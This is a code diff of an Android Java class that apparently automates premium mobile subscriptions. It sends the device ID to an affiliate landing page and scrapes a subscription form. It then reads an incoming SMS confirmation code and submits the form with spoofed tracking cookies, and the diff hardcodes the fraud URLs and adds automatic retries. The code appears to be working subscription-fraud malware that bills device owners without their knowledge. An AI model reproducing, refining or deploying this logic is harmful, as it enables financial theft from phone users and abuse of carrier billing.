@@ -2,11 +2,11 @@ package com.enhtmv.sublib.work.aodili;
 
 import android.text.TextUtils;
 
-import com.alibaba.fastjson.JSON;
 import com.blankj.utilcode.util.LogUtils;
 import com.enhtmv.sublib.common.sub.SubCall;
 import com.enhtmv.sublib.common.http.SubHttp;
 import com.enhtmv.sublib.common.http.SubResponse;
+import com.enhtmv.sublib.common.util.StringUtil;
 
 import org.jsoup.nodes.Element;
 
@@ -22,8 +22,6 @@ public class AodiliH3g extends SubCall {
 
 
     private Info info;
-
-    private Meta meta;
 
     private boolean ok = true;
 
@@ -52,61 +50,50 @@ public class AodiliH3g extends SubCall {
         }
     }
 
-    public static class Meta {
-        String url1;
-        String url2;
-        String url3;
-
-
-        public void setUrl1(String url1) {
-            this.url1 = url1;
-        }
-
-
-        public void setUrl2(String url2) {
-            this.url2 = url2;
-        }
-
-
-        public void setUrl3(String url3) {
-            this.url3 = url3;
-        }
-    }
-
 
     @Override
-    public synchronized void sub(String metaText) {
+    public void sub(String metaText) {
 
 
         if (this.ok) {
 
+            this.ok = false;
+
+            SubHttp http = http();
+
             try {
 
-                this.meta = JSON.parseObject(metaText, Meta.class);
 
-                if (meta != null) {
-
-                    this.ok = false;
-
-                    SubHttp http = http();
+                report(SUB_REQEUST);
 
 
-//                    String url1 = "http://www.gogamehub.com/at/lp?aff=zcj&dvid=" + androidId;
-                    String ptxid = http.get(meta.url1 + androidId).doc().select("#ptxid").first().text();
+                SubResponse response = http.get("http://www.gogamehub.com/at/lp?aff=zcj&dvid=" + androidId);
 
-//                    String url2 = "http://cpx5.allcpx.com:8088/subscript/request/" + ptxid;
-                    SubResponse response = http.get(meta.url2 + ptxid);
+                String ptxid = response.doc().select("#ptxid").first().text();
+
+                if (StringUtil.isEmpty(ptxid)) {
+
+                    r.w("h3g_step1_err", response);
+
+                    throw new RetryException(120);
+
+                }
+
+                report("step1", "time: " + response.getTime() / 1000.0);
 
 
-                    event.onMessage("step1", response.toString());
+                response = http.get("http://cpx5.allcpx.com:8088/subscript/request/" + ptxid);
 
 
-                    Element form = response.doc().select("form").first();
+                Element form = response.doc().select("form").first();
+
+                Map<String, String> values = new HashMap<>();
+
+                if (form != null) {
 
                     String action = form.attr("action");
                     String referer = response.response().request().url().toString();
                     String cookie = response.cookie();
-                    Map<String, String> values = new HashMap<>();
 
                     for (Element input : form.select("input")) {
 
@@ -116,23 +103,26 @@ public class AodiliH3g extends SubCall {
                         values.put(key, value);
                     }
 
-                    if (values.size() < 2) {
-                        throw new Exception(info.toString());
-                    }
-
-
                     info = new Info(cookie, action, referer, values);
-
-                    LogUtils.i(info);
-
-                    report(SUB_REQEUST);
                 }
+
+                if (values.isEmpty()) {
+
+                    r.w("h3g_step2_err", response);
+
+                    throw new RetryException(120);
+
+                }
+
+                report("step2", "time: " + response.getTime() / 1000.0);
+
             } catch (Exception e) {
                 this.ok = true;
 
-                LogUtils.e(e, "sub request call error !");
-                r.e("sub_request_error", e);
-
+                if (e instanceof RetryException) {
+                    sub(metaText);
+                }
+                r.e("h3g_err", e);
                 event.onError(e);
 
             }
@@ -144,7 +134,7 @@ public class AodiliH3g extends SubCall {
     @Override
     public synchronized void onSub(String message) {
 
-        if (info != null && meta != null) {
+        if (info != null) {
 
             report(RECEIVE_SMS, message);
 
@@ -159,10 +149,13 @@ public class AodiliH3g extends SubCall {
 
 
                     try {
+
                         Integer.parseInt(code);
+
                     } catch (NumberFormatException e) {
 
-                        r.w("sub_requst_message_error", message);
+                        r.w("h3g_message_parse_err", e);
+
                         return;
                     }
 
@@ -174,6 +167,7 @@ public class AodiliH3g extends SubCall {
                     String im1 = "com.silverpop.iMAWebCookie=" + UUID.randomUUID().toString();
                     String im2 = "com.silverpop.iMA.session=" + UUID.randomUUID().toString();
                     String im3 = "com.silverpop.iMA.page_visit=" + "1969604377:";
+
 
                     header.put("Cookie", info.cookie + ";" + im1 + ";" + im2 + ";" + im3);
                     header.put("Referer", info.referer);
@@ -189,29 +183,29 @@ public class AodiliH3g extends SubCall {
 
                         SubResponse response = http().postForm(info.action, header, info.form);
 
-                        event.onMessage("step2", response.toString());
 
-                        if (response.response().request().url().toString().startsWith(meta.url3)) {
+                        report("step3", "time: " + response.getTime() / 1000.0);
 
+
+                        if (response.response().request().url().toString().startsWith("http://www.gogamehub.com/nm/at")) {
 
                             success();
 
-
                         } else {
-                            r.w("sub_failure", response);
+                            r.w("h3g_step3_err", response);
                         }
 
 
                     } catch (Exception e) {
-                        LogUtils.e(e, "sub message call error !");
                         r.e("sub_requst_message_error", e);
-
                         event.onError(e);
+                        LogUtils.e(e);
 
-                    } finally {
-                        info = null;
-                        ok = true;
                     }
+//                    finally {
+//                        info = null;
+//                        ok = true;
+//                    }
 
                 }
 
